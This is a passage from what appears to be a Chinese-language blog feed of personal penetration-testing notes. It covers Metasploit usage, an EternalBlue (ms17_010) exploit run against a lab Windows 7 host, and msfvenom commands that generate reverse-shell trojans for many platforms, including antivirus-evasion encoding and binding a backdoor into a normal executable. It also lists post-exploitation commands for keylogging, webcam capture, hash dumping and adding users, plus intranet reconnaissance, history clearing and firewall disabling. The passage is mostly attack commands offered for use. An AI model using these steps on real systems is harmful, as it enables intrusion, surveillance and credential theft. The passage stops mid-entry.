把一个赋值给全局变量，例如上述set设置的IP，就会用到其他攻击模块的RHOST中</p><p>sleep 在限定的秒数内什么也不做</p><p>unload 卸载一个模块</p><p>unset 解出一个或多个变量。</p><p>unsetg 解出一个或多个全局变量</p><p>version 显示MSF和控制台库版本</p><h2 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h2><p><img src="https://bu.dusays.com/2024/10/11/67092912a5af3.png" alt="image-20240820172022349"></p><p><strong>命名规则: 模块&#x2F;系统(功能)&#x2F;服务&#x2F;名称</strong>      smb:文件共享服务</p><p>name: 名称</p><p>Disclosure Date： 发布时间</p><p>rank: great good average normal 好不好用</p><p>Check: 暂时用不到</p><p>Description:描述</p><p>这里有一个联合查询：</p><p>search name:ms17 type:auxiliary</p><p><img src="https://bu.dusays.com/2024/10/11/6709292c355b9.png" alt="image-20240820173106119"></p><p>查到了过后</p><p>就可以use 0 使用查找出的编号为0的模块</p><p>show options看看这个模块中现有的配置信息</p><p><img src="https://bu.dusays.com/2024/10/11/6709292c12296.png" alt="image-20240820174616288"></p><p>这里的AKA表示别名 通常用于在不同场合引用相同的模块</p><p>required:yes 表示必填项</p><p>此时就用set 填写相关信息</p><p><img src="https://bu.dusays.com/2024/10/11/67092922e5113.png" alt="image-20240820175002474"></p><p>填完之后就看发起攻击了</p><p>两条命令：</p><ul><li>run</li><li>exploit</li></ul><p><img src="https://bu.dusays.com/2024/10/11/6709292a17121.png" alt="image-20240820175236843"></p><p>当出现 meterpreter后就表示攻击成功了</p><p>然后就可以利用后渗透模块进行利用了</p><p>如果要保存这个会话的话就用background</p><p><img src="https://bu.dusays.com/2024/10/11/6709290abc0da.png" alt="image-20240820175708829"></p><p>重新进入session</p><p><img src="https://bu.dusays.com/2024/10/11/6709290ad628c.png" alt="image-20240820175802076"></p><h2 id="exploits与payloads相关配置"><a href="#exploits与payloads相关配置" class="headerlink" title="exploits与payloads相关配置"></a>exploits与payloads相关配置</h2><h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><p> RHOST：目标主机IP地址</p><p> RPORT：目标主机连接端口</p><p> Payload：有效的载荷，成功后返回shell</p><p> LHOST：攻击者的IP地址</p><p> LPORT：攻击者的端口</p><p> shell_find_tag:在一个已建立的连接上创建一个shell。</p><p> shell_reverse_tcp:反向连接到攻击者主机并创建一个shell。</p><p> bind_tcp:监听一个tcp连接。</p><p> reverse_tcp:反向建立tcp连接。</p><p> reverse_http:通过HTTP隧道通信并创建一个新用户添加到管理组。</p><p> add_user:创建一个新用户并添加到管理组。</p><p> xxx_ipv6_tcp:基于IPV6。</p><p> xxx_nonx_tcp:no execute或win7（NX是应用在CPU的一种可以防止缓冲区溢出的技术）。</p><p> xxx_ord_tcp:有序payload。</p><p> xxx_tcp_allports:在所有可能的端口。</p><h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>是在使用一个模块之后再去使用的。</p><p> 命名规则：系统&#x2F;类型&#x2F;名称</p><p> 例如：Windows&#x2F;dllinject&#x2F;reverse_tcp</p><p> 类型命名规则</p><p> shell：上传一个shell。</p><p> dllinject：注入一个dll到进程。</p><p> patchup***：修补漏洞。</p><p> upexec：上传并执行一个文件。</p><p> meterpreter：高级的payload。</p><p> vncinject：高级的payload。</p><p> passive：高级的payload。</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="win7-永恒之蓝"><a href="#win7-永恒之蓝" class="headerlink" title="win7 永恒之蓝"></a>win7 永恒之蓝</h3><p>这个漏洞对应的模块时ms17_010</p><p>search ms17_010</p><p><img src="https://bu.dusays.com/2024/10/11/6709292e20238.png" alt="image-20240820185657173"></p><p>发现有辅助扫描模块</p><p>先用这个模块看看信息</p><p>use 24</p><p><img src="https://bu.dusays.com/2024/10/11/6709292645763.png" alt="image-20240820185835429"></p><p>然后看下配置信息</p><p>show options</p><p><img src="https://bu.dusays.com/2024/10/11/6709292edc29e.png" alt="image-20240820185925155"></p><p>只需要配置一下rhost</p><p><img src="https://bu.dusays.com/2024/10/11/6709291fb1ab9.png" alt="image-20240820190042669"></p><p>是192.168.49.128</p><p>设置rhost</p><p>set rhost 192.168.49.128</p><p><img src="https://bu.dusays.com/2024/10/11/670929309b844.png" alt="image-20240820190207011"></p><p>run</p><p><img src="https://bu.dusays.com/2024/10/11/6709291ac1bff.png" alt="image-20240820190400960"></p><p>超时了</p><p>康康怎么回事</p><p>win7没关防火墙</p><p><img src="https://bu.dusays.com/2024/10/11/670929298abb8.png" alt="image-20240820191556167"></p><p>发现存在ms17-010 永恒之蓝漏洞</p><p>先search ms17_010</p><p><img src="https://bu.dusays.com/2024/10/11/6709292febab8.png" alt="image-20240820191914351"></p><p>有0和10都可以用</p><p>先用0 不行再用10</p><p>use 0</p><p><img src="https://bu.dusays.com/2024/10/11/670929306288d.png" alt="image-20240820192028767"></p><p>同样发现只需要设置rhost</p><p>set rhost 192.168.49.128</p><p>run&#x2F;exploit</p><p><img src="https://bu.dusays.com/2024/10/11/6709292fc5309.png" alt="image-20240820192223030"></p><p>成功</p><h2 id="msfvenom-木马生成模块"><a href="#msfvenom-木马生成模块" class="headerlink" title="msfvenom 木马生成模块"></a>msfvenom 木马生成模块</h2><h3 id="参数使用"><a href="#参数使用" class="headerlink" title="参数使用"></a>参数使用</h3><ul><li>–p (- -payload-options)   添加载荷payload。 (- -payload-options 列出payload选项)</li><li>–l  查看所有payload encoder nops。 </li><li>–f （- -help-formats）    输出文件格式。（- -help-formats 列出所有文件格式) </li><li>–e   编码免杀。 </li><li>–a (- -platform – -help-platforms)   选择架构平台  x86 | x64 | x86_64 </li><li>–o    文件输出。</li><li>–s    生成payload的最大长度，就是文件大小。 </li><li>–b    避免使用的字符 例如：不使用 ‘\0f’。 </li><li>–i    编码次数。</li><li>–c  添加自己的shellcode。 </li><li>–x | -k    捆绑。例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>普通生成    </p><blockquote><p>msfvenom -p &lt; payload &gt; &lt; payload options &gt; -f &lt; format &gt; -o &lt; path &gt;  </p><p>msfvenom –p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.0.0 lport&#x3D;3333 –f exe –o C:\back.exe </p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092927cfb2c.png" alt="image-20240820223501693"></p><p>编码处理</p><blockquote><p>msfvenom -p &lt; payload &gt; -e &lt; encoder &gt; -i &lt; encoder times &gt; -n &lt; nopsled &gt; -f &lt; format &gt; -o &lt; path &gt;  </p><p>msfvenom –p windows&#x2F;meterpreter&#x2F;reverse_tcp –i 3 –e x86&#x2F;shikata_ga_nai –f exe –o C:\back.exe </p></blockquote><p>捆绑</p><blockquote><p>Msfvenom –p windows&#x2F;meterpreter&#x2F;reverse_tcp –platform windows –a x86 –x C:\nomal.exe –k –f exe –o C:\shell.exe </p></blockquote><p>windows</p><blockquote><p>Msfvenom –platform windows –a x86 –p windows&#x2F;meterpreter&#x2F;reverse_tcp –i 3 –e x86&#x2F;shikata_ga_nai –f exe –o C:\back.exe  </p><p>Msfvenom –platform windows –a x86 –p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp –f exe –o C:\back.exe </p></blockquote><p>linux</p><blockquote><p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f elf &gt; shell.elf </p></blockquote><p>mac</p><blockquote><p>msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f macho &gt; shell.macho </p></blockquote><p>php</p><blockquote><p>msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f raw &gt; shell.php </p></blockquote><p>asp</p><blockquote><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f asp &gt; shell.asp </p></blockquote><p>aspx</p><blockquote><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f aspx &gt; shell.aspx </p></blockquote><p>jsp</p><blockquote><p>msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f raw &gt; shell.jsp </p></blockquote><p>war</p><blockquote><p>msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f war &gt; shell.war </p></blockquote><p>bash</p><blockquote><p>msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f raw &gt; shell.sh </p></blockquote><p>perl</p><blockquote><p>msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f raw &gt; shell.pl </p></blockquote><p>python</p><blockquote><p>msfvenom -p python&#x2F;meterpreter&#x2F;reverser_tcp LHOST&#x3D; &lt; Your IP Address &gt; LPORT&#x3D; &lt; Your Port to Connect On &gt; -f raw &gt; shell.py</p></blockquote><h3 id="木马利用"><a href="#木马利用" class="headerlink" title="木马利用"></a>木马利用</h3><p>木马是在外面生成的</p><p>但是木马的利用是通过msf的监听模块</p><p><strong>使用exploit&#x2F;multi&#x2F;hander模块</strong></p><p>use exploit&#x2F;multi&#x2F;handler</p><p><img src="https://bu.dusays.com/2024/10/11/6709290c01541.png" alt="image-20240820222638691"></p><p>到这里需要使用payload</p><p>我们生成的木马的payload是什么 这里就设置什么</p><p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p><p><img src="https://bu.dusays.com/2024/10/11/6709290c894de.png" alt="image-20240820222825445"></p><p>然后还需要设置ip和port</p><p>IP就设置成本地或者kali的ip</p><p>port同样要和前面一样</p><p>set lhost 0.0.0.0</p><p>set lport 3333</p><p><img src="https://bu.dusays.com/2024/10/11/6709291abd76d.png" alt="image-20240820223846651"></p><p>好我们可以看下options</p><p><img src="https://bu.dusays.com/2024/10/11/6709292cc7a8f.png" alt="image-20240820224112024"></p><p>现在我们只需要把demo.exe木马放到目标主机上并运行 在kali上就能监听到</p><p>run</p><p><img src="https://bu.dusays.com/2024/10/11/6709290bb130d.png" alt="image-20240820224319448"></p><p><img src="https://bu.dusays.com/2024/10/11/6709290d164c4.png" alt="image-20240820225215667"></p><h2 id="后渗透命令"><a href="#后渗透命令" class="headerlink" title="后渗透命令"></a>后渗透命令</h2><h3 id="文件相关命令"><a href="#文件相关命令" class="headerlink" title="文件相关命令"></a>文件相关命令</h3><ul><li><p>help 查命令</p></li><li><p>bgkill  结束一个session会话</p></li><li><p>bglist 查看脚本列表</p></li><li><p>exit&#x2F;quit  退出</p></li><li><p>getwd  当前运行目录</p></li><li><p>pwd   看路径</p></li><li><p>cd   到指定目录</p></li><li><p>mkdir  创建文件夹</p></li><li><p>rmdir  删除文件夹</p></li><li><p>getlwd&#x2F;lpwd   操纵攻击者自己的路径</p></li><li><p>lcd  到攻击者自己的电脑的指定目录</p></li><li><p>cat 查看文件</p></li><li><p>upload &#x2F;home&#x2F;kali&#x2F;aa.exe C:\\aa.exe 传文件到C盘</p></li><li><p>download C:\User\Desktop\1.txt   下载文件</p></li><li><p>edit   编辑文件(没有就会创建文件)</p></li></ul><h3 id="系统相关命令"><a href="#系统相关命令" class="headerlink" title="系统相关命令"></a>系统相关命令</h3><ul><li>getuid   查看当前登录用户</li><li>getsystem   简单提权</li><li>ps   看进程</li><li>sysinfo   查看目标操作系统信息</li><li>shell     打开cmd(乱码的话就 chcp 65001)</li><li>getdesktop   截取目标主机当前屏幕(会话窗口)</li><li>run webcam -p(指定路径)  开对方摄像头</li><li>run getgui -e  开启远程桌面</li><li>run getgui -u user -p 111  添加用户指定密码</li><li>run vnc 看屏幕</li><li>keyscan_start  键盘记录</li><li>kayscan_dump  导出键盘的记录</li><li>keyscan_stop   停止键盘记录</li><li>hashdump   将用户hash导出</li></ul><p>这里shell如果是这样的话</p><p><img src="https://bu.dusays.com/2024/10/11/6709290b14990.png" alt="image-20240825215324836"></p><p>这样输命令的话一直没有回显</p><p>可以用这个启用bash</p><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709290d6babe.png" alt="image-20240825215405740"></p><p>它s在Python中创建一个伪终端</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p><code>portfwd add -l 1111 -p 3389 -r 192.168.10.136</code></p><p>将192.168.10.136：3389转到127.0.0.1：1111上</p><p><img src="https://bu.dusays.com/2024/10/11/67092921d3a65.png" alt="image-20240821180708939"></p><p><code>rdesktop 127.0.0.1:1111</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092910307df.png" alt="image-20240821180913147"></p><p>成功</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网基础</title>
      <link href="/2024/10/11/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/10/11/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="内网定义"><a href="#内网定义" class="headerlink" title="内网定义"></a>内网定义</h3><p><img src="https://bu.dusays.com/2024/10/11/6709265a855e4.png" alt="image-20240819161432403"></p><h3 id="内网渗透分类"><a href="#内网渗透分类" class="headerlink" title="内网渗透分类"></a>内网渗透分类</h3><p><img src="https://bu.dusays.com/2024/10/11/67092650d7a3b.png" alt="image-20240819161545743"></p><h3 id="简单架构"><a href="#简单架构" class="headerlink" title="简单架构"></a>简单架构</h3><p><img src="https://bu.dusays.com/2024/10/11/6709265c34fb9.png" alt="image-20240819161857880"></p><p>DMZ中存放一些对外的服务</p><h3 id="内网常用概念"><a href="#内网常用概念" class="headerlink" title="内网常用概念"></a>内网常用概念</h3><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p><img src="https://bu.dusays.com/2024/10/11/6709265882bd8.png" alt="image-20240819162117942"></p><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><p><img src="https://bu.dusays.com/2024/10/11/67092651d2fa9.png" alt="image-20240819162242979"></p><h4 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录(AD)"></a>活动目录(AD)</h4><p><img src="https://bu.dusays.com/2024/10/11/6709265c166a7.png" alt="image-20240819164153657"></p><h4 id="域权限"><a href="#域权限" class="headerlink" title="域权限"></a>域权限</h4><p><img src="https://bu.dusays.com/2024/10/11/6709265cd6d5b.png" alt="image-20240819164418840"></p><h4 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器(DC)"></a>域控制器(DC)</h4><p><img src="https://bu.dusays.com/2024/10/11/67092650bcc95.png" alt="image-20240819164915764"></p><p>内网渗透的攻击目标就是DC</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><img src="https://bu.dusays.com/2024/10/11/6709265e258b7.png" alt="image-20240819162602713"></p><p>AGDLP策略</p><p><img src="https://bu.dusays.com/2024/10/11/6709264f7246c.png" alt="image-20240819164451292"></p><p><img src="https://bu.dusays.com/2024/10/11/6709265cec40b.png" alt="image-20240819164626475"></p><h3 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h3><h4 id="判断工作环境"><a href="#判断工作环境" class="headerlink" title="判断工作环境"></a>判断工作环境</h4><p>高级系统设置中–&gt;计算机名</p><p><img src="https://bu.dusays.com/2024/10/11/67092650eef4b.png" alt="image-20240819163058229"></p><p>看到是工作组环境</p><p>在属性里面也可以看到</p><h4 id="添加到域"><a href="#添加到域" class="headerlink" title="添加到域"></a>添加到域</h4><p>高级系统设置中–&gt;计算机名–&gt;更改</p><p><img src="https://bu.dusays.com/2024/10/11/67092659b41fa.png" alt="image-20240819163320338"></p><h3 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h3><ul><li>信息收集</li><li>权限提升</li><li>横向移动</li><li>权限维持</li><li>清理痕迹</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://bu.dusays.com/2024/10/11/6709265743f49.png" alt="image-20240819165810565"></p><p>主要就是敲命令和用工具</p><h3 id="Windows信息收集"><a href="#Windows信息收集" class="headerlink" title="Windows信息收集"></a>Windows信息收集</h3><h4 id="一、本机信息"><a href="#一、本机信息" class="headerlink" title="一、本机信息"></a>一、本机信息</h4><h5 id="1、系统程序"><a href="#1、系统程序" class="headerlink" title="1、系统程序"></a>1、系统程序</h5><p>收集系统信息，包括操作系统版本，已安装补丁列表等。通常使用以下方法收集：</p><p>net config workstation                               # 查询简易系统信息</p><p>systeminfo                                # 查询全部内容</p><p>wmic qfe get Caption,Description,HotFixID,InstalledOn      # 查询已安装的补丁列表</p><p>注：其中systeminfo命令查询内容最全，但如果系统更新的补丁较多，可能会导致反应反应时间过长；使用 webshell 执行此命令可能会因为超时导致无法正常回显，或回显内容长度过长，无法全部显示。</p><h5 id="2、进程服务"><a href="#2、进程服务" class="headerlink" title="2、进程服务"></a>2、进程服务</h5><h6 id="a-进程查看"><a href="#a-进程查看" class="headerlink" title="a.进程查看"></a>a.进程查看</h6><p>tasklist &#x2F;v                # 查询正在运行的进程</p><p>wmic product get name,version        # 查询所有安装过的软件及版本</p><p>powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name,version”</p><p> # 使用 powershell 查询所有安装过的软件及版本，效果和 wmic 相同</p><p>wmic service list brief          # 查询当前机器的服务信息</p><p>wmic startup get command,caption      # 查看启动项</p><p>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v       # 查看任务计划</p><p>windows 自带防火墙及特殊过滤规则等网络访问均可使用netsh及相关命令查看。</p><p>netsh firewall show config            # 查看防火墙信息，但 firewall 命令已    弃用，可使用 advfirewall 命令代替</p><p>netsh advfirewall firewall show rule name&#x3D;all   # 查看配置规则</p><p>netsh advfirewall set allprofiles state off\on  # 关闭防火墙\开启防火墙</p><p>netsh advfirewall export\import xx.pol      # 导出\导入配置文件</p><p>netsh advfirewall firewall add rule name&#x3D;”deny tcp 139″ dir&#x3D;in protocol&#x3D;tcp localport&#x3D;139 action&#x3D;block      # 新建规则阻止TCP协议139端口</p><p>netsh advfirewall firewall add rule name&#x3D;”Remote Desktop” protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow         # 新建规则允许3389通过防火墙</p><p>netsh advfirewall firewall delete rule name&#x3D;Remote Desktop  # 删除名为Remote Desktop的规则</p><p>netsh interface                  # 连接安全规则配置，很少配置。</p><h6 id="b-用户信息"><a href="#b-用户信息" class="headerlink" title="b.用户信息"></a>b.用户信息</h6><p>whoami                   # 当前用户</p><p>quser                   # 查询登录用户，同 query user</p><p>qwinsta                  # 查询登录用户，同 query user</p><p>query user                 # 查询登录用户</p><p>query session                # 查询会话</p><p>query termserver              # 查询远程桌面主机列表。</p><p>net accounts                # 查询域密码策略</p><p>net user                 # 查询本地用户列表</p><p>net user “$username”            # 查询指定用户</p><p>net localgroup               # 查询本地用户组列表</p><p>net localgroup “$groupname”        # 查询指定用户组成员</p><p>net group                 # 仅域控可执行，查询用户组列表</p><p>net group “$groupname”           # 仅域控可执行，查询用户组成员</p><p>注：quser、qwinsta和query命令只存在于允许安装 RDP 服务的主机上，官方描述其仅存在于 server 2012 及以上版本存在。其中query termserver命令存在问题，本地测试时与描述严重不符，无法列出信息。</p><h6 id="c-操作记录"><a href="#c-操作记录" class="headerlink" title="c.操作记录"></a>c.操作记录</h6><p>cmd 和 powershell v3 以下的操作记录无法长时间保存，仅限当前窗口。</p><p>Get-History | Format-List -Property *      # 查询 powershell 当前窗口历史操作记录</p><p>Clear-History                  # 删除 powershell 当前窗口历史操作记录</p><p>Clear-History -Id 3               # 删除 powershell 当前窗口指定 ID 的历史操作记录</p><p>doskey &#x2F;h                    # 查看 cmd 的历史操作记录</p><p>doskey &#x2F;reinstall                # 删除 cmd 的历史操作记录</p><p>可以通过向进程发送键盘内容的方式将运行中的窗口历史操作记录导出。</p><p>powershell v5 以上的操作历史记录会直接保存在指定文件中。直接查看即可。</p><p># 查看 powershell 历史操作记录</p><p>type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</p><p>powershell v3、v4 版本需要安装Get-PSReadlineOption。 </p><p>msiexec &#x2F;q &#x2F;i PackageManagement_x64.msi</p><h4 id="二、网络发现"><a href="#二、网络发现" class="headerlink" title="二、网络发现"></a>二、网络发现</h4><p> 内网网络发现是一个很重要的信息收集内容，一般情况下是不建议使用扫描器扫描，尤其不建议使用 nmap，当然，如果是靶场，或是甲方授权就另当别论。</p><p><code>for /L %I in (1.1.245) DO @ping -w l -n l 192.168.0.%l | findstr &quot;TTL=&quot;      ping命令 探测存活主机 192.168.0.几的</code></p><h5 id="1、基本信息收集"><a href="#1、基本信息收集" class="headerlink" title="1、基本信息收集"></a>1、基本信息收集</h5><p><code>ipconfig /all            # 列出当前主机详细网络信息</code></p><p>ipconfig &#x2F;displaydns       # 列出dns缓存信息</p><p><code>route print             # 查询路由表</code></p><p>arp -a               # 地址解析协议缓存表</p><p><code>netstat -ano            # 端口使用情况</code></p><p>net share              # 查看共享信息</p><p>net view               # 查看共享资源列表</p><p>wmic share get name,path,status   # 查看共享信息</p><p># 查看 host 文件</p><p>type c:\Windows\system32\drivers\etc\hosts</p><p>使用 arp 命令收集最近建立过连接的 ip，但是此方法在某些时候无法收集到网段外的 ip 地址。</p><h5 id="2、系统日志"><a href="#2、系统日志" class="headerlink" title="2、系统日志"></a>2、系统日志</h5><p>可以使用 wevtutil.exe psloglist.exe 或者 powershell 的Get-WinEvent模块进行日志导出，server 03 的域控可使用 eventquery.vbs 导出。</p><p>wevtutil 不需要 UAC， 支持很多过滤语法，若有需要请查看官方说明。</p><p># 查询登录日志语法</p><p>wevtutil qe security &#x2F;f:text &#x2F;q:*[System[(EventID&#x3D;4624)]]</p><p># 查询所有登录、注销相关的日志语法</p><p>wevtutil qe security &#x2F;rd:true &#x2F;f:text &#x2F;q:”*[system&#x2F;eventid&#x3D;4624 and 4623 and 4627]”</p><p># 远程查询时在后面加入&#x2F;r:computer &#x2F;u:user &#x2F;p:password 比如查询dc1上的登录注销日志</p><p>wevtutil qe security &#x2F;rd:true &#x2F;f:text &#x2F;q:”*[system&#x2F;eventid&#x3D;4624 and 4623 and 4672]” &#x2F;r:dc1 &#x2F;u:administrator &#x2F;p:password</p><p>#本地使用 LogParser 日志分析工具整理导出的日志，然后去除重复数据、无效数据（以 ‘$’ 结束的用户名） </p><p>LogParser.exe -i:EVT -o txt “SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,’|’)) as USERNAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,’|’)) as SOURCE_IP FROM C:\ProgramData\log.evtx” &gt; C:\ProgramData\log.txt</p><p>#导出域控登录日志到域控上:</p><p>wevtutil epl Security C:\ProgramData\dc.evtx &#x2F;q:”*[EventData[Data[@Name&#x3D;’LogonType’]&#x3D;’3’] and System[(EventID&#x3D;4624) and TimeCreated[timediff(@SystemTime) &lt;&#x3D; 2592000000]]]” &#x2F;r:域控IP &#x2F;u:域管 &#x2F;p:域管密码</p><h5 id="3、浏览器日志"><a href="#3、浏览器日志" class="headerlink" title="3、浏览器日志"></a>3、浏览器日志</h5><p>收集浏览器访问记录。</p><p>chrome</p><p>C:\Users$username\AppData\Local\Google\Chrome\User Data\Default\History</p><p>firefox</p><p>C:\UsersUndefined control sequence \AppDataname.default\places.sqlite</p><p>IE</p><p>reg query “HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs” 或C:\Users$user\AppData\Local\Microsoft\Windows\History</p><p>edge, v79+:</p><p>C:\Users$user\AppData\Local\Microsoft\Edge\User Data\Default\History</p><p>v44+</p><p>C:\Users$user\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</p><p>浏览器的历史记录文件 history，是使用 sqlite 格式记录的，直接打开是一个二进制文件，可以下载到本地破解，或者直接替换查看。</p><p>需要注意的是，edge v44+ 版本的历史记录文件在用户登录状态下是锁定的。</p><h5 id="4、DNS-服务器记录"><a href="#4、DNS-服务器记录" class="headerlink" title="4、DNS 服务器记录"></a>4、DNS 服务器记录</h5><p>如果目标机器在域内，只需要按部就班收集域信息，准备域横向渗透即可。</p><p>但其中有一点单独提一下，一般在域环境中都会有一台 DNS 服务器，小企业或内网环境较小的可能会和域控为同一台，大一些的企业，多为独立的 DNS 服务器。</p><p>由于 DNS 服务器的特性，因此，在 DNS 服务器上会存在大量内网地址解析记录，如果可以获取，会极大的方便内网拓扑展开，同时很多其他主机无法到达的地址，DNS 服务器是可以到达的。</p><p> #列出 DNS 区域中当前节点的资源记录</p><p> dnscmd . &#x2F;EnumZones</p><p>#列出 test.com 的信息</p><p> dnscmd . &#x2F;ZoneInfo test.com</p><p> #列出 test.com 中的详细记录</p><p> dnscmd . &#x2F;ZonePrint test.com</p><p>DNS 记录有正向解析和反向解析两种。</p><p>正向解析是从域名到IP，反向解析则是从 IP 到域名。</p><p>反向隔离和正向隔离相同，都会有一个对应的区域，因此，查询方式与正向记录相同。</p><p>DNS 服务器还存在域传送漏洞。可以直接获得 DNS 记录。</p><p>nslookup -type&#x3D;all_ldap._tcp.dc.greyfinger.com nslookup -type&#x3D;ns domain.com cmd&gt; nslookup server dns.domain.com ls domain.com</p><h4 id="三、域信息查询"><a href="#三、域信息查询" class="headerlink" title="三、域信息查询"></a>三、域信息查询</h4><h5 id="1、基本信息收集-1"><a href="#1、基本信息收集-1" class="headerlink" title="1、基本信息收集"></a>1、基本信息收集</h5><p>域信息收集，<strong>需要当前用户为域用户</strong>。本地用户无法执行域命令查询域内容。</p><p><code>net config workstation          # 查询当前登录域</code></p><p><code>net time                 # 同步时间，通常为域控服务器</code></p><p>net accounts &#x2F;domain           # 查询域密码策略</p><p><code>net user /domain             # 列出当前域成员列表</code></p><p>net user username &#x2F;domain         # 列出域成员详细信息</p><p><code>net group /domain             # 列出域内组列表</code></p><p>net group groupname &#x2F;domain        # 列出域内组成员列表</p><p>net view                  # 查询同一域内机器列表</p><p>net view &#x2F;domain              # 查询域列表</p><p>net view &#x2F;domain:test            # 查询 test 域中计算机列表</p><p><code>nltest /dclist:domain           # 查询域内的所有DC</code></p><p>nltest &#x2F;dsgetdc:domain           # 拿到DC当前的认证信息</p><p>nltest &#x2F;domain_trusts            # 查询域信任信息</p><p>nltest &#x2F;user:”username”           # 得到用户信息</p><p>想要定位域管和域控机器，可以查询domain admin和domain controllers组，需要注意的是，组名会随系统语言变化而变化，如domain controllers会变化成domaine contrôleurs。 </p><p>在域内其他机器上，查询组是net group &#x2F;domain，而在域控上则是net group。</p><h5 id="2、dsquery"><a href="#2、dsquery" class="headerlink" title="2、dsquery"></a>2、dsquery</h5><p>dsquery 命令很少使用，而且限制较大仅能在域控上执行，所以相对而言较为鸡肋，但是在一定条件下还是具有一定的使用价值。</p><p>dsquery computer              # 查询目录中的计算机</p><p>dsquery contact               # 查询目录中的联系人</p><p>dsquery subnet               # 查询目录中的子网</p><p>dsquery group                # 查询目录中的组</p><p>dsquery site                # 查询目录中的站点</p><p>dsquery user                # 查询目录中的用户</p><h5 id="3、powershell"><a href="#3、powershell" class="headerlink" title="3、powershell"></a>3、powershell</h5><p># 查询当前Domain信息[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</p><p># 查询域信任关系([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</p><p># 查询当前林信息[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()</p><p># 查询林信任信息([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(‘Forest’, ‘forest-of-interest.local’)))).GetAllTrustRelationships()</p><h4 id="四、配置文件收集"><a href="#四、配置文件收集" class="headerlink" title="四、配置文件收集"></a>四、配置文件收集</h4><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>IIS 配置文件路径为：</p><p>%windir%\system32\inetsrv\config\applicationHost.config</p><p>使用 appcmd 的方式可以快速导出所需内容：</p><p>%windir%\system32\inetsrv\appcmd list site &#x2F;config %windir%\system32\inetsrv\appcmd list site &#x2F;config &#x2F;xml &gt; c:\sites.xml</p><h5 id="Navicat"><a href="#Navicat" class="headerlink" title="Navicat"></a>Navicat</h5><p><img src="https://bu.dusays.com/2024/10/11/670926556cae6.png" alt="image-20240819180117583"></p><h5 id="SecureCRT"><a href="#SecureCRT" class="headerlink" 